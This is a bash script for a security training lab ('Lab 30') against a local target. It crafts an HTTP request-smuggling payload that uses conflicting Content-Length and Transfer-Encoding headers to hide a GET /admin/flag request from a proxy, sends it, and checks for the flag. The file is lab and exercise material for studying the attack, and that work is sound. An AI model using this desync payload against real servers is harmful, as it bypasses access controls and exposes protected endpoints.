#!/usr/bin/env bash
# Lab 30 — one message on the wire, two requests to the backend.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9300}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab30
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

python3 - "$URL" "$WORK/desync.http" <<'PY'
import sys
from urllib.parse import urlparse

host = urlparse(sys.argv[1]).netloc

# What the proxy will never see as a request, because to it these bytes are
# the body of the one above.
smuggled = f"GET /admin/flag HTTP/1.1\r\nHost: {host}\r\n\r\n"
body = "0\r\n\r\n" + smuggled
outer = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    f"Content-Type: text/plain\r\n"
    f"Content-Length: {len(body)}\r\n"      # what the proxy reads
    f"Transfer-Encoding: chunked\r\n"       # what the backend reads
    f"\r\n" + body
)
open(sys.argv[2], "wb").write(outer.encode())
PY

"$H5I" browser open "$URL/health" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --raw-request "$WORK/desync.http" | flag
